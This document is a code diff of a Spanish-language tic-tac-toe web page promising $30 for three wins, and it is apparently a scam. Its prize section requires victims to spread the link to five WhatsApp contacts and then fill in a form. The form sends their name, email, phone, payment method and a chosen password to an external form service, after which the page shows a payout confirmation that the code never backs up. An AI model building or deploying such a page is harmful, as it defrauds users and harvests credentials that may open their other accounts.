@@ -9,29 +9,24 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
         }
         body {
             background: linear-gradient(135deg, #0f2027 0%, #203a43 100%);
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
             padding: 20px;
+            text-align: center;
         }
         .advertencia {
             background: #fff3cd;
             border: 2px solid #ffc107;
             color: #856404;
-            padding: 12px 18px;
+            padding: 12px 15px;
             border-radius: 10px;
-            margin-bottom: 10px;
-            text-align: center;
+            margin: 0 auto 10px;
+            max-width: 400px;
             font-weight: bold;
             font-size: 0.9rem;
-            max-width: 420px;
-            line-height: 1.5;
         }
         .advertencia-seguridad {
             background: #f8d7da;
@@ -39,18 +34,15 @@
             color: #721c24;
             padding: 10px 15px;
             border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
+            margin: 0 auto 20px;
+            max-width: 400px;
             font-weight: bold;
             font-size: 0.85rem;
-            max-width: 420px;
-            line-height: 1.5;
         }
         h1 {
             color: white;
-            font-size: 1.8rem;
-            margin-bottom: 5px;
-            text-align: center;
+            font-size: 1.7rem;
+            margin-bottom: 10px;
         }
         .meta {
             background: linear-gradient(90deg, #ffd700, #ffed4e);
@@ -59,13 +51,10 @@
             border-radius: 25px;
             font-weight: bold;
             margin-bottom: 15px;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+            display: inline-block;
         }
-        .progreso-estrellas {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
+        .estrellas {
+            margin: 15px 0;
         }
         .estrella {
             font-size: 2rem;
@@ -74,54 +63,45 @@
         }
         .estrella.ganada {
             opacity: 1;
-            animation: brillar 0.5s ease;
-        }
-        @keyframes brillar {
-            0% { transform: scale(1.5); }
-            100% { transform: scale(1); }
         }
         .tablero {
             display: grid;
-            grid-template-columns: repeat(3, 100px);
-            grid-template-rows: repeat(3, 100px);
+            grid-template-columns: repeat(3, 90px);
             gap: 8px;
-            background: rgba(255,255,255,0.08);
-            padding: 12px;
-            border-radius: 12px;
+            justify-content: center;
+            margin: 20px auto;
         }
         .celda {
-            background: #fff;
+            width: 90px;
+            height: 90px;
+            background: white;
             border-radius: 8px;
+            font-size: 2.2rem;
+            font-weight: bold;
+            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 2.5rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.15s;
-            user-select: none;
+            transition: 0.2s;
         }
-        .celda:hover { background: #f0f0f0; }
-        .jugador { color: #e74c3c; }
-        .maquina { color: #f39c12; }
-
+        .celda:hover {
+            background: #f0f0f0;
+        }
+        .celda.X { color: #e74c3c; }
+        .celda.O { color: #f39c12; }
         .estado {
-            margin-top: 20px;
-            font-size: 1.1rem;
             color: white;
+            font-size: 1.1rem;
             font-weight: bold;
-            height: 35px;
-            text-align: center;
+            margin: 15px 0;
         }
         .mensaje {
-            margin-top: 15px;
-            padding: 18px 28px;
+            padding: 15px 25px;
             border-radius: 10px;
-            font-size: 1rem;
             font-weight: bold;
+            margin: 15px auto;
+            max-width: 400px;
             display: none;
-            text-align: center;
-            max-width: 420px;
         }
         .victoria {
             background: rgba(39, 174, 96, 0.2);
@@ -133,240 +113,92 @@
             color: #ff6b6b;
             border: 1px solid #e74c3c;
         }
-
         .puntuacion {
-            margin-top: 20px;
-            display: flex;
-            gap: 30px;
             color: white;
             font-size: 1rem;
+            margin: 15px 0;
         }
         .boton {
-            margin-top: 15px;
-            padding: 12px 30px;
+            padding: 12px 25px;
             font-size: 1rem;
             border: none;
             border-radius: 25px;
             cursor: pointer;
             font-weight: bold;
-            transition: 0.2s;
-            width: 100%;
+            margin: 8px;
         }
-        .boton:hover { transform: translateY(-2px); }
         .boton-verde { background: #27ae60; color: white; }
-        .boton-verde:hover { background: #219653; }
         .boton-azul { background: #3498db; color: white; }
-        .boton-azul:hover { background: #2980b9; }
         .boton-rojo { background: #e74c3c; color: white; }
-        .boton-rojo:hover { background: #c0392b; }
-        .boton-oro {
-            background: linear-gradient(90deg, #f39c12, #e67e22);
-            color: white;
-            margin-top: 10px;
-        }
-        .boton-oro:hover { background: linear-gradient(90deg, #e67e22, #d35400); }
+        .boton-oro { background: linear-gradient(90deg, #f39c12, #e67e22); color: white; }
 
-        /* === SECCIÓN DE RETIRO === */
         .seccion-retiro {
-            display: none;
             background: white;
             border-radius: 16px;
-            padding: 30px 25px;
-            margin-top: 25px;
-            width: 100%;
+            padding: 25px;
+            margin: 30px auto;
             max-width: 420px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+            display: none;
         }
         .seccion-retiro h2 {
             color: #27ae60;
-            text-align: center;
             margin-bottom: 20px;
-            font-size: 1.4rem;
         }
-        .seccion-retiro h3 {
-            color: #333;
-            font-size: 1rem;
-            margin: 15px 0 8px 0;
-        }
-        .seccion-retiro p {
-            color: #666;
-            font-size: 0.9rem;
+        .form-grupo {
             margin-bottom: 15px;
-            line-height: 1.5;
+            text-align: left;
         }
-
-        /* BARRA DE PROGRESO */
-        .contenedor-barra {
-            margin: 20px 0;
-        }
-        .etiqueta-progreso {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
+        .form-grupo label {
+            display: block;
             font-weight: bold;
-            color: #333;
+            margin-bottom: 5px;
             font-size: 0.9rem;
         }
-        .barra-fondo {
-            background: #e9ecef;
-            height: 24px;
-            border-radius: 12px;
-            overflow: hidden;
-        }
-        .barra-llena {
-            background: linear-gradient(90deg, #25D366, #128C7E);
-            height: 100%;
-            width: 0%;
-            border-radius: 12px;
-            transition: width 0.5s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 0.75rem;
-            font-weight: bold;
-        }
-
-        /* SUBIDA DE CAPTURA */
-        .subida-captura {
-            border: 2px dashed #25D366;
-            border-radius: 12px;
-            padding: 25px 15px;
-            text-align: center;
-            margin: 20px 0;
-            background: #f8fff8;
-            transition: 0.3s;
-        }
-        .subida-captura:hover {
-            background: #e8ffe8;
-        }
-        .subida-captura label {
-            display: block;
-            cursor: pointer;
-            color: #25D366;
-            font-weight: bold;
-            font-size: 1rem;
-        }
-        .subida-captura input[type="file"] {
-            display: none;
-        }
-        .preview-captura {
-            margin-top: 15px;
+        .form-grupo input {
             width: 100%;
-            border-radius: 8px;
-            display: none;
+            padding: 10px;
             border: 1px solid #ddd;
-            max-height: 200px;
-            object-fit: contain;
+            border-radius: 8px;
+            font-size: 0.95rem;
         }
-
         .caja-enlace {
             background: #f8f9fa;
             border: 1px solid #ddd;
             border-radius: 8px;
             padding: 10px;
             font-size: 0.85rem;
-            color: #333;
+            margin: 15px 0;
             word-break: break-all;
-            margin-bottom: 10px;
         }
-
-        .form-grupo {
-            margin-bottom: 15px;
+        .subida-captura {
+            border: 2px dashed #25D366;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            background: #f8fff8;
         }
-        .form-grupo label {
-            display: block;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 5px;
-            font-size: 0.9rem;
-        }
-        .form-grupo input {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 0.95rem;
-        }
-
-        .paso {
-            border-left: 3px solid #27ae60;
-            padding-left: 15px;
-            margin-bottom: 25px;
-        }
-        .paso h4 {
-            color: #27ae60;
-            font-size: 0.95rem;
-            margin-bottom: 10px;
-        }
-
-        .progreso-pasos {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 25px;
-        }
-        .paso-indicador {
-            text-align: center;
-            opacity: 0.3;
-            transition: 0.3s;
-        }
-        .paso-indicador.completo {
-            opacity: 1;
-        }
-        .paso-indicador span {
-            display: block;
-            font-size: 0.75rem;
-            color: #666;
-            margin-top: 3px;
-        }
-        .circulo {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: #ddd;
-            color: #999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            margin: 0 auto;
-        }
-        .paso-indicador.completo .circulo {
-            background: #27ae60;
-            color: white;
-        }
-
-        .exito-registro {
+        .preview-captura {
+            max-width: 100%;
+            margin-top: 10px;
             display: none;
-            background: #d4edda;
-            border: 1px solid #28a745;
-            color: #155724;
-            padding: 15px;
             border-radius: 8px;
-            text-align: center;
+        }
+        .paso {
+            display: none;
+        }
+        .paso.activo {
+            display: block;
+        }
+        .exito {
+            color: #27ae60;
+            font-weight: bold;
+            display: none;
             margin-top: 15px;
         }
-        .completo-mensaje {
-            background: #e8f5e9;
-            border: 2px solid #27ae60;
-            color: #155724;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            margin-top: 20px;
-            display: none;
-            animation: aparecer 0.5s ease;
-        }
-        @keyframes aparecer {
-            from { transform: scale(0.9); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-        iframe { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- ⚠️ ADVERTENCIAS -->
     <div class="advertencia">
         ⚠️ No se pueden repetir las mismas jugadas. Si se detectan jugadas repetidas, no será válido el premio.
     </div>
@@ -375,215 +207,297 @@
     </div>
 
     <h1>🎮 TRES EN RAYA</h1>
+    <div class="meta">🏆 ¡GANA 3 VECES = $30.00 DÓLARES!</div>
 
-    <div class="meta">🏆 ¡GANA 3 VECES = $30.00 DÓLARES! 🏆</div>
-
-    <div class="progreso-estrellas">
+    <div class="estrellas">
         <span class="estrella" id="e1">⭐</span>
         <span class="estrella" id="e2">⭐</span>
         <span class="estrella" id="e3">⭐</span>
     </div>
 
     <div class="tablero" id="tablero">
-        <div class="celda" data-i="0"></div>
-        <div class="celda" data-i="1"></div>
-        <div class="celda" data-i="2"></div>
-        <div class="celda" data-i="3"></div>
-        <div class="celda" data-i="4"></div>
-        <div class="celda" data-i="5"></div>
-        <div class="celda" data-i="6"></div>
-        <div class="celda" data-i="7"></div>
-        <div class="celda" data-i="8"></div>
+        <div class="celda" data-index="0"></div>
+        <div class="celda" data-index="1"></div>
+        <div class="celda" data-index="2"></div>
+        <div class="celda" data-index="3"></div>
+        <div class="celda" data-index="4"></div>
+        <div class="celda" data-index="5"></div>
+        <div class="celda" data-index="6"></div>
+        <div class="celda" data-index="7"></div>
+        <div class="celda" data-index="8"></div>
     </div>
 
-    <div class="estado" id="estado">Tu turno ❌ — ¡Intenta ganar!</div>
-
-    <div class="mensaje victoria" id="msgVictoria">🎉 ¡GANASTE esta partida! Sigue jugando...</div>
+    <div class="estado" id="estado">Tu turno ❌ — ¡Haz clic en una casilla!</div>
+    <div class="mensaje victoria" id="msgVictoria">🎉 ¡GANASTE esta partida!</div>
     <div class="mensaje perdiste" id="msgPerdiste">🤖 La máquina te venció. ¡Inténtalo otra vez!</div>
 
     <div class="puntuacion">
-        <div>Tus victorias: <span id="vJugador">0</span>/3</div>
-        <div>Máquina: <span id="vMaquina">0</span></div>
+        Tus victorias: <span id="puntosJugador">0</span>/3 &nbsp;|&nbsp; 
+        Máquina: <span id="puntosMaquina">0</span>
     </div>
 
-    <button class="boton boton-azul" onclick="reiniciarPartida()">🔄 Nueva Partida</button>
-    <button class="boton boton-rojo" onclick="reiniciarTodo()" id="btnReiniciarTodo" style="display:none;">🔄 Empezar desde Cero</button>
+    <button class="boton boton-azul" onclick="nuevaPartida()">🔄 Nueva Partida</button>
+    <button class="boton boton-rojo" onclick="reiniciarTodo()" id="btnReiniciar" style="display:none;">🔄 Empezar desde Cero</button>
 
-    <!-- === SECCIÓN: RETIRAR PREMIO === -->
-    <div class="seccion-retiro" id="seccionRetiro">
+    <!-- === SECCIÓN DE PREMIO === -->
+    <div class="seccion-retiro" id="seccionPremio">
         <h2>🎉 ¡FELICIDADES! ¡GANASTE $30.00!</h2>
 
-        <div class="progreso-pasos">
-            <div class="paso-indicador" id="paso1-indicador">
-                <div class="circulo">1</div>
-                <span>Compartir</span>
-            </div>
-            <div class="paso-indicador" id="paso2-indicador">
-                <div class="circulo">2</div>
-                <span>Registrarse</span>
-            </div>
-            <div class="paso-indicador" id="paso3-indicador">
-                <div class="circulo">3</div>
-                <span>Retirar</span>
-            </div>
-        </div>
-
-        <!-- PASO 1: COMPARTIR Y SUBIR CAPTURA -->
-        <div class="paso" id="paso1">
-            <h4>PASO 1 / 3</h4>
-            <h3>📲 Comparte con 5 personas por WhatsApp</h3>
-            <p>Sube <strong>una sola captura</strong> donde se vean los 5 contactos con los que compartiste el enlace:</p>
-
-            <div class="contenedor-barra">
-                <div class="etiqueta-progreso">
-                    <span>Compartidos requeridos</span>
-                    <span id="contadorCompartidos">0 / 5</span>
-                </div>
-                <div class="barra-fondo">
-                    <div class="barra-llena" id="barraCompartidos">
-                        <span id="porcentajeTexto">0%</span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="caja-enlace" id="enlaceCompartir">
-                https://joserudencio.github.io
-            </div>
-            <button class="boton boton-verde" onclick="compartirWhatsApp()">📲 Compartir por WhatsApp</button>
-            <p style="font-size: 0.8rem; color: #888; margin-top: 8px;" id="mensajeCopiado"></p>
-
-            <div class="subida-captura">
-                <label for="capturaWhatsApp">
-                    📷 Haz clic para subir la captura de los 5 compartidos
-                </label>
-                <input type="file" id="capturaWhatsApp" accept="image/*" onchange="subirCaptura(event)">
-                <img id="previewCaptura" class="preview-captura" alt="Vista previa de la captura">
-            </div>
-
-            <div class="completo-mensaje" id="completoPaso1">
-                ✅ ¡Excelente! Captura cargada con éxito<br>
-                Ahora completa tu registro para recibir tus $30.00 💵
-                <button class="boton boton-verde" style="margin-top: 12px;" onclick="irPaso2()">➡️ Continuar al Registro</button>
-            </div>
-        </div>
-
-        <!-- PASO 2: REGISTRO CON FORMSPREE -->
-        <div class="paso" id="paso2" style="display: none;">
-            <h4>PASO 2 / 3</h4>
-            <h3>📝 Completa tu registro</h3>
-            <p>Ingresa tus datos para crear tu cuenta y recibir tu premio de $30.00:</p>
-
-            <iframe name="formDestino" style="display:none;"></iframe>
+        <!-- PASO 1 -->
+        <div class="paso activo" id="paso1">
+            <h3>📲 Paso 1: Comparte por WhatsApp</h3>
+            <p>Comparte con 5 personas y sube la captura de pantalla:</p>
             
-            <form id="formularioRegistro" action="https://formspree.io/f/mvkgpv1k" method="POST" target="formDestino">
-                <div class="form-grupo">
-                    <label for="nombre">Nombre Completo:</label>
-                    <input type="text" id="nombre" name="nombre" placeholder="Tu nombre completo" required>
-                </div>
-                <div class="form-grupo">
-                    <label for="correo">Correo Electrónico:</label>
-                    <input type="email" id="correo" name="email" placeholder="tu@email.com" required>
-                </div>
-                <div class="form-grupo">
-                    <label for="celular">Número de Celular:</label>
-                    <input type="tel" id="celular" name="celular" placeholder="+593 XXX XXX XXX" required>
-                </div>
-                <div class="form-grupo">
-                    <label for="metodo">Método de Pago:</label>
-                    <input type="text" id="metodo" name="metodo" placeholder="PayPal / Banco / Binance / etc." required>
-                </div>
-                <div class="form-grupo">
-                    <label for="contrasena">Contraseña:</label>
-                    <input type="password" id="contrasena" name="contrasena" placeholder="Crea una contraseña" required>
-                </div>
-                <div class="form-grupo">
-                    <label for="confirmar-contrasena">Confirmar Contraseña:</label>
-                    <input type="password" id="confirmar-contrasena" placeholder="Vuelve a escribir tu contraseña" required>
-                </div>
-
-                <button type="submit" class="boton boton-verde" onclick="return validarContrasena()">📤 Crear Cuenta</button>
-            </form>
-
-            <div class="exito-registro" id="exitoRegistro">
-                ✅ ¡Registro enviado con éxito!<br>
-                Redirigiendo... ⏳
+            <div class="caja-enlace" id="enlace">
+                https://josetapias.github.io/gana-30dolares/
             </div>
+            
+            <button class="boton boton-verde" onclick="compartirWhatsApp()">📲 Abrir WhatsApp</button>
+            
+            <div class="subida-captura">
+                <label>📷 Sube tu captura:</label><br><br>
+                <input type="file" id="fotoCaptura" accept="image/*" onchange="mostrarFoto(event)">
+                <img id="vistaFoto" class="preview-captura" alt="Captura">
+            </div>
+            
+            <button class="boton boton-verde" onclick="irPaso2()">➡️ Siguiente Paso</button>
         </div>
 
-        <!-- PASO 3: CONFIRMACIÓN FINAL -->
-        <div class="paso" id="paso3" style="display: none;">
-            <h4>PASO 3 / 3</h4>
-            <h3>💰 ¡Todo listo!</h3>
-            <p>✅ Tu solicitud de retiro de <strong>$30.00 USD</strong> ha sido registrada exitosamente.</p>
-            <p style="color: #666; font-size: 0.85rem;">El pago se procesará en un plazo de 24 a 48 horas hábiles. Te enviaremos una confirmación a tu correo electrónico.</p>
-            <button class="boton boton-oro" onclick="alert('¡Gracias por participar! Revisa tu correo pronto 💌')">🎉 ¡Entendido!</button>
+        <!-- PASO 2 -->
+        <div class="paso" id="paso2">
+            <h3>📝 Paso 2: Completa tus datos</h3>
+            <form id="formulario" action="https://formspree.io/f/mvkgpv1k" method="POST">
+                <div class="form-grupo">
+                    <label>Nombre Completo:</label>
+                    <input type="text" name="nombre" required>
+                </div>
+                <div class="form-grupo">
+                    <label>Correo Electrónico:</label>
+                    <input type="email" name="email" required>
+                </div>
+                <div class="form-grupo">
+                    <label>Número de Celular:</label>
+                    <input type="tel" name="celular" required>
+                </div>
+                <div class="form-grupo">
+                    <label>Método de Pago:</label>
+                    <input type="text" name="metodo" placeholder="PayPal / Banco / etc." required>
+                </div>
+                <div class="form-grupo">
+                    <label>Contraseña:</label>
+                    <input type="password" name="contrasena" id="clave1" required>
+                </div>
+                <div class="form-grupo">
+                    <label>Confirmar Contraseña:</label>
+                    <input type="password" id="clave2" required>
+                </div>
+                <button type="submit" class="boton boton-verde" onclick="return validarClaves()">📤 Enviar Registro</button>
+            </form>
+            <div class="exito" id="exitoRegistro">✅ ¡Registro enviado con éxito!</div>
+        </div>
+
+        <!-- PASO 3 -->
+        <div class="paso" id="paso3">
+            <h3>💰 ¡Todo Listo!</h3>
+            <p>✅ Tu solicitud de retiro de <strong>$30.00 USD</strong> ha sido registrada.</p>
+            <p style="color: #666; font-size: 0.9rem; margin-top: 10px;">El pago se procesará en 24 a 48 horas hábiles. Revisa tu correo.</p>
+            <button class="boton boton-oro" onclick="alert('¡Gracias por participar! 💌')">🎉 ¡Entendido!</button>
         </div>
     </div>
 
     <script>
-        let tablero = ['','','','','','','','',''];
-        let activo = true;
-        let victoriasJugador = 0;
-        let victoriasMaquina = 0;
-        const victoriasMeta = 3;
-        const ganadoras = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-
-        const ENLACE = "https://josetapias.github.io/gana-30dolares/";
-        const MENSAJE_WHATSAPP = "¡Hola! Gana treinta dólares con este sencillo juego de tres en raya. Únete y prueba suerte aquí: " + ENLACE;
+        const tablero = ['','','','','','','','',''];
+        let turnoJugador = true;
+        let jugando = true;
+        let puntosJugador = 0;
+        let puntosMaquina = 0;
+        const meta = 3;
+        const combinaciones = [
+            [0,1,2], [3,4,5], [6,7,8],
+            [0,3,6], [1,4,7], [2,5,8],
+            [0,4,8], [2,4,6]
+        ];
 
         const celdas = document.querySelectorAll('.celda');
         const estado = document.getElementById('estado');
         const msgVictoria = document.getElementById('msgVictoria');
         const msgPerdiste = document.getElementById('msgPerdiste');
-        const seccionRetiro = document.getElementById('seccionRetiro');
-        const btnReiniciarTodo = document.getElementById('btnReiniciarTodo');
+        const seccionPremio = document.getElementById('seccionPremio');
+        const btnReiniciar = document.getElementById('btnReiniciar');
 
-        celdas.forEach(c => c.addEventListener('click', clicJugador));
+        // Asignar eventos a las celdas
+        celdas.forEach(celda => {
+            celda.addEventListener('click', function() {
+                const indice = parseInt(this.getAttribute('data-index'));
+                hacerMovimiento(indice);
+            });
+        });
 
-        function clicJugador(e) {
-            const i = parseInt(e.target.dataset.i);
-            if (tablero[i] !== '' || !activo) return;
+        function hacerMovimiento(i) {
+            if (!jugando || tablero[i] !== '') return;
 
             ocultarMensajes();
             tablero[i] = 'X';
-            e.target.textContent = '❌';
-            e.target.classList.add('jugador');
+            celdas[i].textContent = '❌';
+            celdas[i].classList.add('X');
 
             if (hayGanador('X')) {
-                victoriaDelJugador();
+                ganaste();
                 return;
             }
 
             if (!tablero.includes('')) {
-                estado.textContent = '🤝 Empate — intenta otra vez';
-                activo = false;
-                setTimeout(reiniciarPartida, 1500);
+                estado.textContent = '🤝 Empate — ¡Intenta otra vez!';
+                jugando = false;
                 return;
             }
 
-            estado.textContent = '🤖 Pensando...';
-            setTimeout(clicMaquina, 500);
+            estado.textContent = '🤖 La máquina está pensando...';
+            jugando = false;
+            setTimeout(movimientoMaquina, 600);
         }
 
-        function clicMaquina() {
-            const i = mejorMovimiento();
+        function movimientoMaquina() {
+            const i = mejorJugada();
             tablero[i] = 'O';
             celdas[i].textContent = '⭕';
-            celdas[i].classList.add('maquina');
+            celdas[i].classList.add('O');
 
             if (hayGanador('O')) {
-                victoriasMaquina++;
-                document.getElementById('vMaquina').textContent = victoriasMaquina;
-                estado.textContent = '🤖 ¡La máquina gana esta partida!';
-                msgPerdiste.style.display = 'block';
-                activo = false;
+                perdiste();
                 return;
             }
 
             if (!tablero.includes('')) {
-                estado.textContent = '🤝 Empate';
-                activo = false;
+                estado.textContent = '🤝 Empate — ¡Intenta otra vez!';
+                jugando = false;
                 return;
             }
 
-            estado.textContent = 'Tu turno ❌';
+            estado.textContent = 'Tu turno ❌ — ¡Haz clic en una casilla!';
+            jugando = true;
+        }
+
+        function mejorJugada() {
+            // Intentar ganar
+            for (let c of combinaciones) {
+                const [a,b,cc] = c;
+                if (tablero[a]==='O' && tablero[b]==='O' && tablero[cc]==='') return cc;
+                if (tablero[a]==='O' && tablero[cc]==='O' && tablero[b]==='') return b;
+                if (tablero[b]==='O' && tablero[cc]==='O' && tablero[a]==='') return a;
+            }
+            // Bloquear al jugador
+            for (let c of combinaciones) {
+                const [a,b,cc] = c;
+                if (tablero[a]==='X' && tablero[b]==='X' && tablero[cc]==='') return cc;
+                if (tablero[a]==='X' && tablero[cc]==='X' && tablero[b]==='') return b;
+                if (tablero[b]==='X' && tablero[cc]==='X' && tablero[a]==='') return a;
+            }
+            // Centro primero
+            if (tablero[4]==='') return 4;
+            // Esquinas
+            const esquinas = [0,2,6,8].filter(n => tablero[n]==='');
+            if (esquinas.length) return esquinas[0];
+            // Bordes restantes
+            return [1,3,5,7].find(n => tablero[n]==='');
+        }
+
+        function hayGanador(jugador) {
+            return combinaciones.some(c => c.every(i => tablero[i] === jugador));
+        }
+
+        function ganaste() {
+            puntosJugador++;
+            document.getElementById('puntosJugador').textContent = puntosJugador;
+            document.getElementById('e' + puntosJugador).classList.add('ganada');
+            msgVictoria.style.display = 'block';
+            jugando = false;
+
+            if (puntosJugador >= meta) {
+                estado.textContent = '🏆 ¡MISIÓN CUMPLIDA! Completa los pasos abajo:';
+                btnReiniciar.style.display = 'inline-block';
+                seccionPremio.style.display = 'block';
+                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+            }
+        }
+
+        function perdiste() {
+            puntosMaquina++;
+            document.getElementById('puntosMaquina').textContent = puntosMaquina;
+            msgPerdiste.style.display = 'block';
+            jugando = false;
+        }
+
+        function ocultarMensajes() {
+            msgVictoria.style.display = 'none';
+            msgPerdiste.style.display = 'none';
+        }
+
+        function nuevaPartida() {
+            for (let i = 0; i < 9; i++) {
+                tablero[i] = '';
+                celdas[i].textContent = '';
+                celdas[i].classList.remove('X','O');
+            }
+            jugando = true;
+            turnoJugador = true;
+            ocultarMensajes();
+            estado.textContent = 'Tu turno ❌ — ¡Haz clic en una casilla!';
+        }
+
+        function reiniciarTodo() {
+            if (confirm('¿Empezar desde cero? Perderás tu progreso de $30')) {
+                puntosJugador = 0;
+                puntosMaquina = 0;
+                document.getElementById('puntosJugador').textContent = '0';
+                document.getElementById('puntosMaquina').textContent = '0';
+                for (let i = 1; i <= 3; i++) {
+                    document.getElementById('e'+i).classList.remove('ganada');
+                }
+                seccionPremio.style.display = 'none';
+                btnReiniciar.style.display = 'none';
+                nuevaPartida();
+            }
+        }
+
+        // === FUNCIONES COMPARTIR Y FORMULARIO ===
+        function compartirWhatsApp() {
+            const mensaje = "¡Hola! Gana treinta dólares con este sencillo juego de tres en raya. Únete y prueba suerte aquí: https://josetapias.github.io/gana-30dolares/";
+            window.open("https://wa.me/?text=" + encodeURIComponent(mensaje), "_blank");
+        }
+
+        function mostrarFoto(e) {
+            const archivo = e.target.files[0];
+            if (archivo) {
+                const vista = document.getElementById('vistaFoto');
+                vista.src = URL.createObjectURL(archivo);
+                vista.style.display = 'block';
+            }
+        }
+
+        function irPaso2() {
+            document.getElementById('paso1').classList.remove('activo');
+            document.getElementById('paso2').classList.add('activo');
+        }
+
+        function validarClaves() {
+            const c1 = document.getElementById('clave1').value;
+            const c2 = document.getElementById('clave2').value;
+            if (c1 !== c2) {
+                alert('❌ Las contraseñas no coinciden');
+                return false;
+            }
+            if (c1.length < 4) {
+                alert('⚠️ La contraseña debe tener al menos 4 caracteres');
+                return false;
+            }
+            document.getElementById('exitoRegistro').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('paso2').classList.remove('activo');
+                document.getElementById('paso3').classList.add('activo');
+            }, 2000);
+            return true;
+        }
+    </script>
+</body>
+</html>
